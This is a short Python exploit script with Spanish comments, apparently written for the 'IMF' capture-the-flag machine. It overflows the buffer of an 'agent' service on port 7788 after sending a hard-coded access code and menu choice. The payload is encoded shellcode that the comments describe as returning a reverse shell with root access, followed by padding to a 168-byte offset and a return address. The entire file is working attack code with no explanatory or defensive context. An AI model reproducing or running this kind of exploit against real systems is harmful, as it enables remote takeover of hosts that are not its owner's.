#!/usr/bin/env python3
import socket
#Obtener una reverse shell mediante bufferoverflow del programa agent en maquina IMF para Obtener una terminal con acceso root

IMF_IP = input("ingresa la maquina: ")
offset = 168

#shellcode ----> envia una consola interactiva
buf =  b""
buf += b"\xda\xd5\xd9\x74\x24\xf4\xb8\x57\x9d\x05\xb9\x5b"
buf += b"\x2b\xc9\xb1\x12\x31\x43\x17\x83\xc3\x04\x03\x14"
buf += b"\x8e\xe7\x4c\xab\x6b\x10\x4d\x98\xc8\x8c\xf8\x1c"
buf += b"\x46\xd3\x4d\x46\x95\x94\x3d\xdf\x95\xaa\x8c\x5f"
buf += b"\x9c\xad\xf7\x37\xdf\xe6\x1a\xc2\xb7\xf4\x1a\xcd"
buf += b"\xfc\x70\xfb\x7d\x64\xd3\xad\x2e\xda\xd0\xc4\x31"
buf += b"\xd1\x57\x84\xd9\x84\x78\x5a\x71\x31\xa8\xb3\xe3"
buf += b"\xa8\x3f\x28\xb1\x79\xc9\x4e\x85\x75\x04\x10"

buf += b"A" * (offset-len(buf)) 

buf += b"\x63\x85\x04\x08\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((f"{IMF_IP}", 7788))
s.send(b"48093572\n")
data = s.recv(1024)
print(data)
s.send(b"3\n")
data = s.recv(1024)
s.sendall(buf)





